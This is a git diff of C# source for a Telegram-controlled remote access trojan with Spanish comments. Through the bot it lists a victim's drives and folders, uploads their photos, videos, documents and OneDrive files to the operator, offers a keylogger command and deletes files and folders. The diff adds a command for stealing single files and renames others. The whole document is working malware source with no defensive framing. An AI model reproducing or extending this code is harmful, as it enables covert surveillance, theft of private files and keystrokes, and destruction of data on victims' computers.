@@ -16,21 +16,10 @@ using Telegram.Bot.Types.ReplyMarkups;
 namespace RAT_BotTelegram {
     class Program {
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
-
-
         public static string Path { get; set; }
-
-        //public void SetBuffer(string texto){
-        //    PathCommands = texto;
-        //}
-        //public string GetBuffer() {
-        //    return PathCommands;
-        //}
-
-        // Debes escribir el ID, para que el bot solo te responda a tí.
         static void Main(string[] args) {
+            #region Main
 
-            
             // Copiar
             // Esconder
             // Iniciar script
@@ -55,12 +44,12 @@ namespace RAT_BotTelegram {
             Bot.SendTextMessageAsync(config.ID, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");
 
             //Bot.SendVideoAsync(config.ID, File.Open(@"F:\New folder (2)\40.3gp",FileMode.Open),999,999,999,"info",ParseMode.Default,false,false);
-
+            
             // Escucha servidor
             Bot.StartReceiving();
             Console.ReadLine();
-            Console.WriteLine("La maquina se lenvantó ");
             Bot.StopReceiving();
+            #endregion
         }
 
         private static async void GetDirectoryAll(string path, int indent = 0) {
@@ -81,6 +70,8 @@ namespace RAT_BotTelegram {
                 await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
             }
         }
+
+
         private static async void ListarFiles(string Path) {
             if (Path == "") {
                 SendBotMessage("Usted no ingresó una ruta en el comando.\nEjemplo de comando:\n /Dir O:\\OneDrive - xKx\\Photos and Videos of my Life\\2019\\Family  ");
@@ -93,6 +84,7 @@ namespace RAT_BotTelegram {
             
         }
         private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
+            
             var message = messageEventArgs.Message;
 
             if (message == null || message.Type != MessageType.Text) return;
@@ -100,13 +92,12 @@ namespace RAT_BotTelegram {
             string Command = message.Text.Split(' ').First();           // Case "Comando"
             Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
 
-
             switch (message.Text.Split(' ').First()) {
-
+                #region CommandsFinish 
                 case "/Status": // Verifica Si la PC se encuentra en linea
                     await Bot.SendTextMessageAsync(config.ID, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                     break;
-                case "/Get_Information":
+                case "/Show_Information":
                     await Bot.SendTextMessageAsync(config.ID, Tools.PC_Info());
                     break;
                 case "/Get_FilesAll":  // Menú Obtiene archivos
@@ -149,13 +140,18 @@ namespace RAT_BotTelegram {
                     await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                     await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
                     break;
-                // await Bot.SendTextMessageAsync(config.ID, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
-
+ ;
+               
                 case "/Dir":
-                    ListarFiles(Path);
+
+                    if (Path.Length <= 4) {
+                        SendBotMessage("Si usted desea listar una unidad, hagalo con el comando: \n/Dir_DirectoryDisk\n Ya que el comando /Dir es solo para lisar carpetas especificas y no unidades\n NOTA: Espero en las proximas actualizaciones parchar ese error. ");
+                    } else {
+                        ListarFiles(Path);
+                    }
                     Path = "";
                     break;
-                case "/Dir_DirectoyDisk":
+                case "/Dir_FolderDisk":
                     var Disk = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree C:\\"       ,callbackData: "DDC"),
@@ -196,6 +192,20 @@ namespace RAT_BotTelegram {
                     
 
                     break;
+
+                #endregion
+
+
+
+                case "/Get_OnlyFile":
+                    if (Path.Length <= 4) {
+                        SendBotMessage("Ejemplo de comando\n ");
+                    } else {
+                        GetOnlyFileTelegram(Path);
+                    }
+                    Path = "";
+
+                    break;
                 case "Dir_FilesDisk":
 
                     break;
@@ -206,49 +216,50 @@ namespace RAT_BotTelegram {
 
                     // Obtiene Nombre del procesador
                     //string[] allfiles = null;
-                    string ruta = @"O:\"; 
-
-                    
-                    async void Recorre(string Path,int indent) {
-                        int n = 0;
-                        try {
-                            foreach (string folder in Directory.GetDirectories(Path)) {
-
-                                switch (folder) {
-                                    // Other Disk
-                                    case @"\$RECYCLE.BIN": break;
-                                    case @"$Recycfle.Bin": break;
-                                    case @"System Volume Information": break;
-                                    case @"OneDriveTemp": break;
-                                    case @"ProgramData": break;
-                                    case @"Recovery": break;
-                                    case "": break;
-                                    //case "": break;
-                                    //case "": break;
-
-                                    default:
-                                        await Bot.SendTextMessageAsync(config.ID, "=>" + folder + "\n");
-                                        break;
-                                }
+                    string ruta = @"O:\";
 
 
-                                n = n + 1;
-                                
-
-                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
-
-                                // allfiles[n] = folder;
-
-                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
-                                //GetDirectoryAll(folder, indent + 2);
-                            }
-                        } catch (UnauthorizedAccessException) {
-                        }
-
-                    }
-
-                    //async void ShowAllFoldersUnder(string path, int indent) {
+                    #region Pruebas de futuras funciones 
+                    //async void Recorre(string Path,int indent) {
+                    //    int n = 0;
                     //    try {
+                    //        foreach (string folder in Directory.GetDirectories(Path)) {
+
+                    //            switch (folder) {
+                    //                // Other Disk
+                    //                case @"\$RECYCLE.BIN": break;
+                    //                case @"$Recycfle.Bin": break;
+                    //                case @"System Volume Information": break;
+                    //                case @"OneDriveTemp": break;
+                    //                case @"ProgramData": break;
+                    //                case @"Recovery": break;
+                    //                case "": break;
+                    //                //case "": break;
+                    //                //case "": break;
+
+                    //                default:
+                    //                    await Bot.SendTextMessageAsync(config.ID, "=>" + folder + "\n");
+                    //                    break;
+                    //            }
+
+
+                    //            n = n + 1;
+
+
+                    //            //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+
+                    //            // allfiles[n] = folder;
+
+                    //            //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+                    //            //GetDirectoryAll(folder, indent + 2);
+                    //        }
+                    //    } catch (UnauthorizedAccessException) {
+                    //    }
+
+                    //}
+
+                    ////async void ShowAllFoldersUnder(string path, int indent) {
+                    ////    try {
                     //        if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
                     //            foreach (string folder in Directory.GetDirectories(path)) {
                     //                //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));
@@ -262,54 +273,54 @@ namespace RAT_BotTelegram {
                     //}
                     //ShowAllFoldersUnder(@"L:\", 0);
 
-                    //Recorre(Path, 0);
-                    async void Recorre2(string Path, int indent) {
-                        int n = 0;
-                        try {
-                            foreach (string folder in Directory.GetDirectories(Path) ){ //, "*", SearchOption.AllDirectories
-                                n = n + 1;
-                                //Directory.GetAccessControl(folder);
-                                //FileInfo fil = new FileInfo(folder);
-                                //if (fil.IsReadOnly) {
-                                await Bot.SendTextMessageAsync(config.ID, "" + folder+"\n"
-                                    + Directory.GetAccessControl(folder)+
-                                    Directory.GetDirectoryRoot(folder));
-                                //} else {
-                                  //  await Bot.SendTextMessageAsync(config.ID, "Es libre " + folder+ fil.IsReadOnly);
-                                //}
+                    ////Recorre(Path, 0);
+                    //async void Recorre2(string Path, int indent) {
+                    //    int n = 0;
+                    //    try {
+                    //        foreach (string folder in Directory.GetDirectories(Path) ){ //, "*", SearchOption.AllDirectories
+                    //            n = n + 1;
+                    //            //Directory.GetAccessControl(folder);
+                    //            //FileInfo fil = new FileInfo(folder);
+                    //            //if (fil.IsReadOnly) {
+                    //            await Bot.SendTextMessageAsync(config.ID, "" + folder+"\n"
+                    //                + Directory.GetAccessControl(folder)+
+                    //                Directory.GetDirectoryRoot(folder));
+                    //            //} else {
+                    //              //  await Bot.SendTextMessageAsync(config.ID, "Es libre " + folder+ fil.IsReadOnly);
+                    //            //}
 
 
-                                //await Bot.SendTextMessageAsync(config.ID, "=>" + folder);
-                                //try {
-                                //   // FileInfo fil = new FileInfo(folder);
-                                //    string FData =
-                                //        "\n<b>Name =</b> " + fil.Name +
-                                //        "\n<b>Extension =</b> " + fil.Extension +
-                                //        "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
-                                //        "\n<b>Creation Data =</b> " + fil.CreationTime +
-                                //        "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
-                                //        "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
-                                //        "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
-                                //        "\n<b>Directory =</b> " + fil.DirectoryName +
-                                //        "\n<b>Full Directory =</b> ";
-            
-                                //} catch {
-                                    
-                                //}
+                    //            //await Bot.SendTextMessageAsync(config.ID, "=>" + folder);
+                    //            //try {
+                    //            //   // FileInfo fil = new FileInfo(folder);
+                    //            //    string FData =
+                    //            //        "\n<b>Name =</b> " + fil.Name +
+                    //            //        "\n<b>Extension =</b> " + fil.Extension +
+                    //            //        "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
+                    //            //        "\n<b>Creation Data =</b> " + fil.CreationTime +
+                    //            //        "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
+                    //            //        "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
+                    //            //        "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
+                    //            //        "\n<b>Directory =</b> " + fil.DirectoryName +
+                    //            //        "\n<b>Full Directory =</b> ";
+
+                    //            //} catch {
+
+                    //            //}
 
 
-                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+                    //            //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
 
-                                // allfiles[n] = folder;
+                    //            // allfiles[n] = folder;
 
-                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
-                                //GetDirectoryAll(folder, indent + 2);
-                            }
-                        } catch (UnauthorizedAccessException) {
-                        }
+                    //            //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+                    //            //GetDirectoryAll(folder, indent + 2);
+                    //        }
+                    //    } catch (UnauthorizedAccessException) {
+                    //    }
 
-                    }
-                    //Recorre(Path, 0);
+                    //}
+                    ////Recorre(Path, 0);
 
                     //const string PathC = @"L:\";
                     //foreach (var file in Tools.GetFolder(Path)) {
@@ -328,6 +339,8 @@ namespace RAT_BotTelegram {
 
                     //    }
                     //}
+
+                    #endregion
                     await Bot.SendTextMessageAsync(config.ID, "FINISH || " );
                     //    await Bot.SendTextMessageAsync(config.ID, "El texto completo fue:" + message.Text + "\n\nInicio: " + Command.Length + "\nFinal:" + message.Text.Length);
                     //    await Bot.SendTextMessageAsync(config.ID, "\n" + message.Text.Substring(Command.Length));
@@ -348,16 +361,15 @@ namespace RAT_BotTelegram {
                 default:
                     const string usage =
                   "\n/Status                   <Check if the PC is online>" +
-                  "\n/Get_Information <get detailed system information>" +
-                  "\n/Get_FilesAll          |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
-                  "\n/Get_DirFiles      |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
-                  "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subscarpetas.
-                  "\n/Dir_DirectoyDisk     |Menu| Only Directory Tree Drive" +  // Lista Arbol de solo ditectorios
-                  "\n/Dir_FilesDisk  <Path>       |Menu| Only Files Tree Drive" +  // Lista Arbol de todos loa rchivos.
-                  "\n/Keylogger          |Menu| <keylogger Options >" +
-                  "\n/Delete_File <Path>" +
-                  "\n/DeleteFolder <Path>" +
-                  "\n/Help                    <This>" +
+                  "\n/Show_Information <get detailed system information>" +     // Muestra información del sistema
+                  "\n/Get_FilesAll          |Menu| <Get Files from Computer>" +  //Sube archivos [Imagenes,Fotos, Videos y documentos]
+                  "\n/Get_OnlyFile  <Path>   C:\\User\\Photos and videos\\foto34.jpg " +    //Sube solo un archivo especifico.
+                  "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subcarpetas.
+                  "\n/Dir_FolderDisk     |Menu| Only Folder Tree Drive" +  // Lista Arbol de solo carpetas de Unidades de almacemiento
+                  "\n/Keylogger           <Get File log >" +                    // Obtiene el registro de teclas por mensaje
+                  "\n/Delete_OnlyFile <Path> " +                                 // Elimina un archivo
+                  "\n/Delete_Folder <Path> " +
+                  "\n/Help                    <This menu>" +
                   "";
                     await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n" , ParseMode.Html );
                     await Bot.SendTextMessageAsync(config.ID, usage, replyMarkup: new ReplyKeyboardRemove());
@@ -409,12 +421,10 @@ namespace RAT_BotTelegram {
                 return true;    // No supera los 10Mb
             }
         }
-        private static async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
-            await Bot.SendTextMessageAsync(config.ID, "******************** Start ********************** ");
-            if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
-                await Bot.SendTextMessageAsync(config.ID, "La carpeta no existe!!, \n\nIntente con otra dirección.");
-            } else {
-                foreach (var file in Tools.GetFile(Path)) {
+
+        private async static void GetOnlyFileTelegram(string file) {
+            if (file != "") {
+                try {
                     if (infoFileZize(file)) {
                         switch (GetFileType(file)) {
                             case "[Imagen]":
@@ -470,7 +480,24 @@ namespace RAT_BotTelegram {
                     } else {
                         await Bot.SendTextMessageAsync(config.ID, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                     }
-                    await Bot.SendTextMessageAsync(config.ID, file);
+
+                } catch {
+                    SendBotMessage("No se encontró el archivo");
+                    throw;
+                }
+            } else {
+                SendBotMessage("La Ruta ingresada está vacía");
+            }
+            
+            
+        }
+        private static async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
+            await Bot.SendTextMessageAsync(config.ID, "******************** Start ********************** ");
+            if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
+                await Bot.SendTextMessageAsync(config.ID, "La carpeta no existe!!, \n\nIntente con otra dirección.");
+            } else {
+                foreach (var file in Tools.GetFile(Path)) {
+                    GetOnlyFileTelegram(file);
                 }
             }
 
@@ -622,7 +649,6 @@ namespace RAT_BotTelegram {
                 case "DDW":    GetDirectoryAll(@"W:\"); SendBotMessage("Finish Command"); break;
                 case "DDX":    GetDirectoryAll(@"X:\"); SendBotMessage("Finish Command"); break;
                 case "DDZ":    GetDirectoryAll(@"Z:\"); SendBotMessage("Finish Command"); break;
-                                                     
 
 
 
@@ -637,6 +663,7 @@ namespace RAT_BotTelegram {
 
 
 
+                #region Cases de envío de archivos mediante red 
 
 
                 case "GetDocumenttgert":
@@ -744,6 +771,8 @@ namespace RAT_BotTelegram {
                         messageId: callbackQuery.Message.MessageId
                         );
                     break;
+
+                    #endregion
             }
         }
         private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs) {
